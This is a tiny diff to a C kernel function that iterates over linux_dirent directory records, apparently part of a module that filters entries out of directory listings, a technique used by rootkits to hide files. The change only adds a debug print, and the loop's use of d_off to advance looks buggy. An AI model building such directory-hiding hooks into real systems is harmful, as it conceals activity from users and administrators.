@@ -83,6 +83,7 @@ static inline int filter_out(struct linux_dirent __user *dirp, int length, int (
 			index_copyto += reclen;
 		}*/
 		
+		pr_info("%lu %lu", d->d_reclen, d->d_off);
 		index += d->d_off;
 	}
 	
